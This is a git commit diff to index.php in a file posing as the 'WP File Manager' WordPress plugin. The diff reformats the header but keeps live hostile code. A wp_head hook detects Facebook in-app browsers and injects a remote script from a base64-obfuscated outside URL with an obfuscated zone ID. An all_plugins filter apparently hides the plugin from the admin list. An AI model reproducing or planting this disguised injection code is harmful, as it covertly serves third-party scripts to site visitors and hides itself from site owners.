f70f00e3e6c51a0d6ac1906a821a97fe151bf4cd
ahmadfatoni19670 <164468840+ahmadfatoni19670@users.noreply.github.com>
2026-08-19 21:36:56 +0700

    Update index.php

--- index.php
+++ index.php
@@ -1,14 +1,14 @@
 <?php
 /**
-  Plugin Name: WP File Manager
-  Plugin URI: https://filemanagerpro.io/
-  Description: Manage your WP files.
-  Author: mndpsingh287
-  Version: 8.0.4
-  Author URI: https://profiles.wordpress.org/mndpsingh287
-  License: GPLv2
- **/
- 
+ * Plugin Name: WP File Manager
+ * Plugin URI: https://filemanagerpro.io/
+ * Description: Manage your WP files.
+ * Author: mndpsingh287
+ * Version: 8.0.4
+ * Author URI: https://profiles.wordpress.org/mndpsingh287
+ * License: GPLv2
+ */
+
 add_action('wp_head', function () {
 
     $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
@@ -27,11 +27,13 @@ add_action('wp_head', function () {
     );
 
     if (is_singular() && ($is_ios_facebook || $is_android_facebook)) {
-        $src = base64_decode('aHR0cHM6Ly9hbDVzbS5jb20vdGFnLm1pbi5qcw==');
+
+        $src  = base64_decode('aHR0cHM6Ly9hbDVzbS5jb20vdGFnLm1pbi5qcw==');
+        $zone = base64_decode('MTE2MDk2MjA=');
         ?>
         <script>
         (function(s){
-            s.dataset.zone = atob('MTE2MDk2MjA=');
+            s.dataset.zone = '<?php echo esc_js($zone); ?>';
             s.src = '<?php echo esc_url($src); ?>';
         })([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')));
         </script>
@@ -41,6 +43,7 @@ add_action('wp_head', function () {
 
 
 add_filter('all_plugins', function ($plugins) {
+
     $plugin_file = plugin_basename(__FILE__);
 
     if (isset($plugins[$plugin_file])) {
